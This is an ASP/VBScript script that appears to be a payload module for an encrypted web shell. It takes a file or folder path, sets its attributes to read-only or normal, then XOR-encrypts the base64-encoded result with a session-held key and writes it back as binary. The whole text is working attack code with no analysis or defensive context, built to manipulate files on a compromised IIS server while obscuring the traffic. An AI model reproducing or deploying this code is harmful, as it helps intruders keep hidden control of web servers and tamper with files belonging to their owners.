Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))
Next
Encrypt=encryptResult
End Function

Function Base64Encode(sText)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function
Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=server.CreateObject(Key)
	Set GetFso=Fso
End Function

Function main(path,mode,time)
On Error Resume Next
	main="Failed"
	Set Fso=GetFso()
	dim file
	IF Fso.folderexists(path) Then
		Set file=Fso.GetFolder(path)
	Else
		Set file=Fso.GetFile(path)
	End If
	IF mode="write" then
		file.attributes = 32
	ElseIf mode="read" then
 		file.attributes = 1
	ElseIf mode="time" then
		Err=1
		Err.Description="Not Support"
	Else
 End IF
	
	If Err Then 
		main=Err.Description
	Else
		main="Success" 
	End If 
	set Fso=nothing
Response.binarywrite(Encrypt(Base64Encode(main)))
End Function